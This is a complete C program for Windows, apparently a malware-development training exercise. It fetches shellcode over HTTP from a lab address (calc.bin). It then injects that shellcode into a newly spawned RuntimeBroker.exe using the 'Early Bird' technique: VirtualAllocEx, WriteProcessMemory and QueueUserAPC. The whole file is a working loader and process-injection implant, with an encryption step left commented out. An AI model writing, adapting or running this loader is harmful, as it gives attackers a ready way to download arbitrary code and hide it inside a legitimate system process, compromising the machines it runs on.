#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
#pragma comment (lib, "Wininet.lib")
#define PAYLOAD L"http://192.168.58.128/calc.bin"
#define TARGET_PROCESS		"RuntimeBroker.exe"
#pragma warning (disable:4996)



BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL; 	 		

	PBYTE		pBytes = NULL,					
		pTmpBytes = NULL;				


	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {


		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);


		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}

	}


	// Saving 
	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);										
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);									
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
	if (pTmpBytes)
		LocalFree(pTmpBytes);												
	return bSTATE;
}




BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	//if (!Rc4EncryptionViSystemFunc032(&Rc4Key, pShellcode, sizeof(Rc4Key), sSizeOfShellcode))
	//{
	//	printf("[!] Rc4EncryptionViSystemFunc032 Failed: %d\n", GetLastError());
	//	return FALSE;
	//}

	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %ld Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


/*

create a process in suspend mode 

*/
BOOL CreateSuspendedProcess2(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };


	ZeroMemory(&Si, sizeof(STARTUPINFO));
	ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));


	Si.cb = sizeof(STARTUPINFO);

	// C:\windows
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// C:\windows\system32\runtimeBroker.exe
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,
		NULL,
		NULL,
		&Si,
		&Pi)) {
		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");


	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

	return FALSE;
}


int main() {
	HANDLE		hProcess = NULL,
		hThread = NULL;
	DWORD		dwProcessId = NULL;
	SIZE_T	Size = NULL;
	PBYTE	Bytes = NULL;
	PVOID pAddress = NULL;
	printf("[i] Downloading the Payload From: %ls \n", PAYLOAD);
	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}


	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);
	printf("[i] address : 0x%p\n", Bytes);
	printf("[!] Press enter to continue .... \n");
	getchar();
	//Create Process

	printf("[i] Creating \"%s\" Process As A Debugged Process ... ", TARGET_PROCESS);
	if (!CreateSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}
	printf("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
	printf("[+] DONE \n\n");
	printf("[!] Press enter to continue .... \n");
	getchar();
	//Early Bird 

	printf("[i] Writing Shellcode To The Target Process ... ");
	if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size, &pAddress)) {
		return -1;
	}
	printf("[+] DONE \n\n");
	printf("[!] Press enter to continue .... \n");
	getchar();
	//	running QueueUserAPC
	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);

	printf("[#] Run The Shellcode ... ");


	printf("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessId);
	printf("[+] DONE \n\n");
	printf("[!] Press enter to exit .... \n");
	getchar();
	// Clearing
	CloseHandle(hProcess);
	CloseHandle(hThread);
	LocalFree(Bytes);
	printf("[#] Quiting ... ");


	return 0;
}









